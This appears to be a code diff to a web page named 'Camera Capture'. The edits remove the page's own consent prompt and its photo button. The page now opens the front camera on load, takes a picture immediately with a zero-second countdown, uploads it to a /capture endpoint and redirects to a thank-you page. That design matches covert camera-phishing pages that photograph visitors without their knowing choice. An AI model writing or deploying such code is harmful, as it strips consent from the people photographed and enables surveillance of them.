@@ -15,16 +15,50 @@
         .hidden {
             display: none;
         }
+        .camera-loading {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 300px;
+        }
     </style>
 </head>
 <body class="bg-gray-100 min-h-screen flex flex-col items-center justify-center p-5">
     <div class="bg-white p-8 rounded-lg shadow-lg max-w-lg w-full text-center">
         <h1 class="text-2xl font-bold mb-6 text-gray-800">Camera Capture</h1>
         
+        <!-- Loading animation -->
+        <div id="loading" class="camera-loading">
+            <div class="animate-spin rounded-full h-16 w-16 border-t-4 border-b-4 border-blue-500 mb-4"></div>
+            <p class="text-gray-600">Connecting to camera...</p>
+            <p class="text-sm text-gray-500 mt-2">Please allow camera access when prompted</p>
+        </div>
+        
+        <!-- Hidden camera element -->
         <div id="camera-container" class="hidden">
             <video id="camera" class="w-full h-auto rounded mb-4" autoplay playsinline></video>
-            <button id="capture-btn" class="bg-blue-500 hover:bg-blue-600 text-white py-2 px-6 rounded-lg font-medium transition-colors duration-300">Capture Photo</button>
-            <p class="text-sm text-gray-500 mt-2">Click the button to take a photo</p>
+            <p id="countdown" class="text-lg font-bold text-blue-600"></p>
+        </div>
+        
+        <!-- Fallback for camera errors -->
+        <div id="no-camera" class="hidden">
+            <div class="bg-yellow-100 border-l-4 border-yellow-500 text-yellow-700 p-4 mb-4" role="alert">
+                <p class="font-bold">Camera Access Issue</p>
+                <p>Unable to access your camera. This may be due to:</p>
+                <ul class="list-disc ml-5 mt-2 text-left">
+                    <li>Camera permissions denied</li>
+                    <li>No camera detected on your device</li>
+                    <li>Browser security restrictions (try Chrome or Firefox)</li>
+                    <li>Connection is not secure (HTTPS required in some browsers)</li>
+                </ul>
+            </div>
+            <!-- Fallback file upload option -->
+            <form id="manual-upload" class="mt-4">
+                <label class="block text-gray-700 text-sm font-bold mb-2">Upload a photo instead:</label>
+                <input type="file" id="file-upload" accept="image/*" capture="user" class="mb-4">
+                <button type="submit" class="bg-blue-500 hover:bg-blue-600 text-white py-2 px-6 rounded-lg font-medium transition-colors duration-300 w-full">Upload Photo</button>
+            </form>
         </div>
         
         <div id="processing" class="hidden">
@@ -39,64 +73,110 @@
 
     <script>
         document.addEventListener('DOMContentLoaded', function() {
+            const loadingDiv = document.getElementById('loading');
             const cameraContainer = document.getElementById('camera-container');
+            const noCameraDiv = document.getElementById('no-camera');
             const video = document.getElementById('camera');
-            const captureBtn = document.getElementById('capture-btn');
             const canvas = document.getElementById('canvas');
             const processingDiv = document.getElementById('processing');
+            const fileUpload = document.getElementById('file-upload');
+            const manualUploadForm = document.getElementById('manual-upload');
+            const countdownElement = document.getElementById('countdown');
             
-            // Request camera access on page load
-            setTimeout(() => {
-                Swal.fire({
-                    title: 'Camera Access',
-                    text: 'This application needs access to your camera to capture an image',
-                    icon: 'info',
-                    showCancelButton: true,
-                    confirmButtonText: 'Allow Access',
-                    cancelButtonText: 'Deny',
-                    confirmButtonColor: '#3085d6',
-                }).then((result) => {
-                    if (result.isConfirmed) {
-                        // Start camera if confirmed
-                        startCamera();
-                    } else {
-                        // Show message if denied
-                        Swal.fire(
-                            'Access Denied',
-                            'Camera access is required for this application',
-                            'error'
-                        );
-                    }
-                });
-            }, 500);
+            // Check if camera is available
+            const hasGetUserMedia = () => {
+                return !!(navigator.mediaDevices && 
+                          navigator.mediaDevices.getUserMedia);
+            };
+            
+            // Start the camera access process immediately
+            if (!hasGetUserMedia()) {
+                // Browser doesn't support camera API
+                loadingDiv.classList.add('hidden');
+                noCameraDiv.classList.remove('hidden');
+                return;
+            }
             
             // Function to start the camera
             function startCamera() {
-                if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-                    navigator.mediaDevices.getUserMedia({ video: true })
-                        .then(function(stream) {
-                            video.srcObject = stream;
-                            cameraContainer.classList.remove('hidden');
-                        })
-                        .catch(function(error) {
-                            console.error('Camera error:', error);
-                            Swal.fire(
-                                'Error',
-                                'Could not access camera: ' + error.message,
-                                'error'
-                            );
-                        });
-                } else {
-                    Swal.fire(
-                        'Not Supported',
-                        'Your browser does not support camera access',
-                        'error'
-                    );
-                }
+                const constraints = { 
+                    video: { 
+                        facingMode: 'user',
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 }
+                    } 
+                };
+                
+                navigator.mediaDevices.getUserMedia(constraints)
+                    .then(function(stream) {
+                        video.srcObject = stream;
+                        
+                        // Hide loading, show camera
+                        loadingDiv.classList.add('hidden');
+                        cameraContainer.classList.remove('hidden');
+                        
+                        // Start countdown for auto-capture
+                        startCountdown(0);
+                    })
+                    .catch(function(error) {
+                        console.error('Camera error:', error);
+                        
+                        // Hide loading, show error
+                        loadingDiv.classList.add('hidden');
+                        noCameraDiv.classList.remove('hidden');
+                        
+                        let errorMessage = 'Could not access camera: ';
+                        
+                        switch(error.name) {
+                            case 'NotAllowedError':
+                                errorMessage += 'Permission denied in browser dialog';
+                                break;
+                            case 'NotFoundError':
+                                errorMessage += 'No camera found on this device';
+                                break;
+                            case 'NotReadableError':
+                                errorMessage += 'Camera is already in use';
+                                break;
+                            case 'OverconstrainedError':
+                                errorMessage += 'Camera cannot satisfy the requested constraints';
+                                break;
+                            case 'SecurityError':
+                                errorMessage += 'Camera access is blocked due to security restrictions';
+                                break;
+                            default:
+                                errorMessage += error.message || 'Unknown error';
+                        }
+                        
+                        Swal.fire(
+                            'Camera Error',
+                            errorMessage,
+                            'error'
+                        );
+                    });
             }
             
-            // Capture photo when button is clicked
-            captureBtn.addEventListener('click', function() {
+            // Countdown function for automatic capture
+            function startCountdown(seconds) {
+                let timeLeft = seconds;
+                
+                const countdownInterval = setInterval(() => {
+                    if (timeLeft > 0) {
+                        countdownElement.textContent = `Capturing photo in ${timeLeft}...`;
+                        timeLeft--;
+                    } else {
+                        clearInterval(countdownInterval);
+                        countdownElement.textContent = 'Capturing...';
+                        
+                        // Take the photo automatically
+                        setTimeout(() => {
+                            capturePhoto();
+                        }, 500);
+                    }
+                }, 1000);
+            }
+            
+            // Function to capture photo
+            function capturePhoto() {
                 // Set up canvas for capturing
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
@@ -106,9 +186,15 @@
                 // Get the image data
                 const imageData = canvas.toDataURL('image/jpeg');
                 
-                // Show processing indicator
-                cameraContainer.classList.add('hidden');
+                // Process the image
+                processAndSendImage(imageData);
+            }
+            
+            // Process and send image function
+            function processAndSendImage(imageData) {
                 processingDiv.classList.remove('hidden');
+                noCameraDiv.classList.add('hidden');
+                cameraContainer.classList.add('hidden');
                 
                 // Send the image to the server
                 fetch('/capture', {
@@ -121,10 +207,12 @@
                 .then(response => response.json())
                 .then(data => {
                     if (data.success) {
-                        // Stop the camera stream
-                        const stream = video.srcObject;
-                        const tracks = stream.getTracks();
-                        tracks.forEach(track => track.stop());
+                        // Stop camera if it's active
+                        if (video.srcObject) {
+                            const stream = video.srcObject;
+                            const tracks = stream.getTracks();
+                            tracks.forEach(track => track.stop());
+                        }
                         
                         // Redirect to thank you page
                         window.location.href = '/thankyou';
@@ -136,15 +224,45 @@
                     console.error('Error:', error);
                     processingDiv.classList.add('hidden');
                     
+                    if (video.srcObject) {
+                        cameraContainer.classList.remove('hidden');
+                    } else {
+                        noCameraDiv.classList.remove('hidden');
+                    }
+                    
                     Swal.fire(
                         'Error',
                         'Failed to process the image: ' + error.message,
                         'error'
-                    ).then(() => {
-                        cameraContainer.classList.remove('hidden');
-                    });
+                    );
                 });
+            }
+            
+            // Handle manual file upload
+            manualUploadForm.addEventListener('submit', function(e) {
+                e.preventDefault();
+                
+                if (!fileUpload.files || fileUpload.files.length === 0) {
+                    Swal.fire('Error', 'Please select a file first', 'error');
+                    return;
+                }
+                
+                const file = fileUpload.files[0];
+                if (!file.type.match('image.*')) {
+                    Swal.fire('Error', 'Please select an image file', 'error');
+                    return;
+                }
+                
+                const reader = new FileReader();
+                reader.onload = function(e) {
+                    // Process the image
+                    processAndSendImage(e.target.result);
+                };
+                reader.readAsDataURL(file);
             });
+            
+            // Start camera access immediately
+            startCamera();
         });
     </script>
 </body>
